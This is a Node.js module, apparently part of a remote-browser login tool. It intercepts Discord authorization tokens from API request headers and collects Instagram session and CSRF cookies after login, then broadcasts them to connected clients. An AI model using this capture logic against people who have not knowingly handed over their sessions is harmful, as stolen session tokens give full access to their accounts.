// ── token-capture.js ─────────────────────────────────────
// Extracts Discord auth token and Instagram session from browser.

const { broadcast, stopScreenshots, closeBrowser, CHROME_UA } = require('./browser-manager');

function setupDiscordCapture(svc, pageIndex) {
    const entry = svc.pages[pageIndex];
    if (!entry) return;
    entry.page.on('request', (request) => {
        if (svc.tokenCaptured) return;
        if (!request.url().includes('discord.com/api/')) return;
        const auth = request.headers()['authorization'];
        if (auth && auth.length > 20 && !auth.startsWith('undefined')) {
            svc.tokenCaptured = true;
            svc.capturedToken = auth;
            stopScreenshots(svc);
            console.log('[discord] Token captured!');
            broadcast(svc, { type: 'token', token: auth });
            setTimeout(() => closeBrowser(svc, 'discord'), 3000);
        }
    });
}

function setupInstagramCapture(svc, pageIndex) {
    const entry = svc.pages[pageIndex];
    if (!entry) return;
    let capturePending = false;

    // Dismiss post-login dialogs so the session cookie becomes available
    const dialogDismisser = setInterval(async () => {
        if (svc.tokenCaptured) { clearInterval(dialogDismisser); return; }
        try {
            const page = entry.page;
            const notNow = page.locator('button:has-text("Not Now"), button:has-text("Not now")').first();
            if (await notNow.isVisible({ timeout: 500 }).catch(() => false)) {
                await notNow.click();
                console.log('[instagram] Dismissed "Save login info" dialog');
                return;
            }
            const notNow2 = page.locator('[role="dialog"] button:has-text("Not Now"), [role="dialog"] button:has-text("Not now")').first();
            if (await notNow2.isVisible({ timeout: 500 }).catch(() => false)) {
                await notNow2.click();
                console.log('[instagram] Dismissed notification dialog');
            }
        } catch (_) {}
    }, 1500);

    async function tryCapture() {
        if (svc.tokenCaptured || capturePending) return;
        capturePending = true;
        try {
            await entry.page.waitForTimeout(1500);
            const cookies = await svc.context.cookies('https://www.instagram.com');
            const sessionCookie = cookies.find(c => c.name === 'sessionid');
            const csrfCookie    = cookies.find(c => c.name === 'csrftoken');
            if (sessionCookie?.value) {
                clearInterval(dialogDismisser);
                svc.tokenCaptured = true;
                const fullCookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
                svc.capturedSession = {
                    sessionId: sessionCookie.value,
                    csrfToken: csrfCookie?.value || '',
                    fullCookies: fullCookieStr,
                    userAgent: CHROME_UA
                };
                stopScreenshots(svc);
                console.log('[instagram] Session captured! (' + cookies.length + ' cookies)');
                broadcast(svc, { type: 'session', ...svc.capturedSession });
                setTimeout(() => closeBrowser(svc, 'instagram'), 3000);
            }
        } catch (_) {}
        capturePending = false;
    }

    entry.page.on('framenavigated', async () => {
        if (svc.tokenCaptured) return;
        const url = entry.page.url();
        if (url.includes('/login') || url.includes('/challenge')) return;
        await tryCapture();
    });
}

module.exports = { setupDiscordCapture, setupInstagramCapture };
